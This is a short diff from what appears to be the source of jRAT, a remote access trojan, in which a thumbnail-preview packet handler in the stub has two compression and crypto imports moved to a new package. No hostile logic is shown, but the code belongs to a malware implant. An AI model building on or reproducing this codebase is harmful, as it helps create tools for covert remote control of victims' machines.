@@ -5,14 +5,14 @@ import java.io.File;
 
 import javax.imageio.ImageIO;
 
+import pro.jrat.common.compress.GZip;
+import pro.jrat.common.crypto.Crypto;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Main;
 import pro.jrat.stub.RemoteScreen;
 import pro.jrat.stub.packets.outgoing.Packet59ThumbnailPreview;
 import pro.jrat.stub.utils.ImageUtils;
 
-import com.redpois0n.common.compress.GZip;
-import com.redpois0n.common.crypto.Crypto;
 
 public class Packet85ThumbnailPreview extends AbstractIncomingPacket {
 
